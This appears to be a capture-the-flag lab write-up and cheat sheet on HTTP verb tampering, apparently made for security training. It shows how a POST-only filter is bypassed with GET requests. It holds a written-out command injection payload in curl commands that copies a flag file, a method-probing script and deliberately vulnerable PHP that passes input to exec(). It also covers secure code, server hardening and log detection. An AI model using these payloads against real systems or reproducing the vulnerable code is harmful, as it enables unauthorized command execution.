# 🛰️ HTTP Verb Tampering: Exploiting Insecure Method Validation

## Overview of Vulnerability
[!INFO]HTTP Verb Tampering is a technique where an attacker manipulates the HTTP method (e.g., GET, POST) to bypass security controls and execute unauthorized actions. This involves exploiting weaknesses in server or application configurations that fail to properly validate all HTTP methods.

## Exploitation Techniques

### 1. Bypass Security Filters with Special Characters
[!WARNING]This section contains destructive commands. Ensure you are testing on a controlled environment.

**Example:**
```bash
# POST request to exploit filename injection vulnerability
curl http://94.237.57.115:43846/ -d "filename=test;"

# Expected: "Malicious Request Denied!"
```

### 2. Bypass Filter with GET Method
[!SUCCESS]Convert POST requests to GET to bypass security filters.

**Example:**
```bash
# Convert POST to GET to bypass filter
curl "http://94.237.57.115:43846/?filename=test;"

# Should create file with special characters (no error)
```

### 3. Execute Command Injection
[!DANGER]This command may cause irreversible damage on the target system.

**Example:**
```bash
# Use payload to copy flag file
curl "http://94.237.57.115:43846/?filename=file;%20cp%20/flag.txt%20./"

# URL decoded payload: file; cp /flag.txt ./
```

### 4. Verification
[!SUCCESS]Check if the flag file has been copied.

**Example:**
```bash
# Check if flag.txt was copied to web directory
curl http://94.237.57.115:43846/flag.txt

# Should display the flag content
```

### Alternative Burp Method:
1. Intercept POST request with payload: `filename=file; cp /flag.txt ./`
2. Right-click → "Change Request Method" → Convert to GET
3. Forward request
4. Access `http://94.237.57.115:43846/flag.txt` to retrieve flag

---

## Common HTTP Methods for Testing

### Standard Methods
[!INFO]
```bash
GET     # Default - usually protected
POST    # Form submissions - usually protected  
HEAD    # Like GET but no body - often bypasses auth
PUT     # Upload/update - may bypass filters
DELETE  # Remove resources - may bypass restrictions
PATCH   # Partial updates - often overlooked
OPTIONS # Method enumeration - usually allowed
```

### Extended Methods
[!WARNING]
```bash
TRACE   # Debugging method - may reveal headers
CONNECT # Proxy method - rarely filtered
TRACK   # Microsoft extension - may bypass
COPY    # WebDAV method - may access resources
MOVE    # WebDAV method - may modify resources
LOCK    # WebDAV method - may control resources
```

---

## Automated Testing

### Custom Script for Method Testing
[!EXAMPLE]
```bash
#!/bin/bash
# http-verb-test.sh

URL="$1"
METHODS=("GET" "POST" "HEAD" "PUT" "DELETE" "PATCH" "OPTIONS")

echo "Testing HTTP methods on: $URL"
echo "================================"

for method in "${METHODS[@]}"; do
    echo -n "Testing $method: "
    response=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$URL")
    echo "HTTP $response"
done
```

**Usage:**
```bash
chmod +x http-verb-test.sh
./http-verb-test.sh http://target.com/admin/reset.php
```

### Burp Suite Intruder
[!INFO]
**Setup:**
1. Send request to Intruder
2. Set position on HTTP method
3. Payload list: GET, POST, HEAD, PUT, DELETE, PATCH, OPTIONS
4. Start attack and analyze response codes

---

## Vulnerable Code Examples

### PHP - Insecure Authentication Handling
[!WARNING]
```php
<?php
// Vulnerable: Only checks authentication for GET
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    // Check authentication
    if (!isset($_SERVER['PHP_AUTH_USER'])) {
        header('WWW-Authenticate: Basic realm="Admin"');
        header('HTTP/1.0 401 Unauthorized');
        exit;
    }
}

// Dangerous: Function executes regardless of method
if (isset($_GET['action']) && $_GET['action'] == 'reset') {
    unlink_all_files(); // Executes for HEAD, POST, etc.
}
?>
```

### PHP - Insecure Security Filter
[!WARNING]
```php
<?php
// Vulnerable: Security filter only checks POST parameters
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $filename = $_POST['filename'];
    
    // Security filter for POST only
    if (preg_match('/[;|&`$]/', $filename)) {
        die("Malicious Request Denied!");
    }
}

// Dangerous: GET parameters bypass security filter
if (isset($_GET['filename'])) {
    $filename = $_GET['filename']; // No filtering!
    
    // Command injection vulnerability
    exec("touch uploads/" . $filename);
}

// Processing without method validation
if (isset($_POST['filename']) || isset($_GET['filename'])) {
    $file = $_POST['filename'] ?? $_GET['filename'];
    exec("touch uploads/" . $file); // Vulnerable to injection
}
?>
```

### Secure Implementation
[!SUCCESS]
```php
<?php
// Secure: Check authentication for all methods
function require_auth() {
    if (!isset($_SERVER['PHP_AUTH_USER'])) {
        header('WWW-Authenticate: Basic realm="Admin"');
        header('HTTP/1.0 401 Unauthorized');
        exit;
    }
}

// Secure: Consistent input validation across all methods
function validate_filename($filename) {
    // Block dangerous characters regardless of method
    if (preg_match('/[;|&`$<>]/', $filename)) {
        die("Invalid filename!");
    }

    // Whitelist approach
    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $filename)) {
        die("Filename contains invalid characters!");
    }
    
    return true;
}

// Check auth before any processing
require_auth();

// Secure: Get input from any method with validation
$filename = '';
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['filename'])) {
    $filename = $_POST['filename'];
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['filename'])) {
    $filename = $_GET['filename'];
}

// Apply security filter regardless of HTTP method
if (!empty($filename)) {
    validate_filename($filename);
    
    // Safe file creation with sanitization
    $safe_filename = basename($filename);
    touch("uploads/" . $safe_filename);
}
?>
```

---

## Prevention & Hardening

### Web Server Configuration

**Apache (.htaccess)**
[!SUCCESS]
```apache
# Restrict HTTP methods globally
<Limit GET POST>
    Require valid-user
</Limit>

# Block specific methods
<LimitExcept GET POST>
    Require all denied
</LimitExcept>
```

**Nginx**
[!SUCCESS]
```nginx
# Limit allowed methods
if ($request_method !~ ^(GET|POST)$ ) {
    return 405;
}

# Apply auth to all methods
location /admin/ {
    auth_basic "Restricted Area";
    auth_basic_user_file /etc/nginx/.htpasswd;

    # Ensure auth applies to all methods
    limit_except GET POST {
        deny all;
    }
}
```

### Application-Level Controls

**Comprehensive Method Checking:**
[!SUCCESS]
```php
<?php
// Define allowed methods for each endpoint
$allowed_methods = ['GET', 'POST'];
$current_method = $_SERVER['REQUEST_METHOD'];

if (!in_array($current_method, $allowed_methods)) {
    header('HTTP/1.1 405 Method Not Allowed');
    header('Allow: ' . implode(', ', $allowed_methods));
    exit;
}

// Apply authentication to all allowed methods
require_authentication();
?>
```

---

## Detection & Monitoring

### Log Analysis
[!SUCCESS]
```bash
# Monitor for unusual HTTP methods
grep -E "(HEAD|PUT|DELETE|PATCH|TRACE|OPTIONS)" /var/log/apache2/access.log

# Look for 200 responses to HEAD requests on admin paths
grep "HEAD.*admin.*200" /var/log/apache2/access.log
```

### Security Headers
[!SUCCESS]
```http
# Server response should include
Allow: GET, POST
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
```
---

---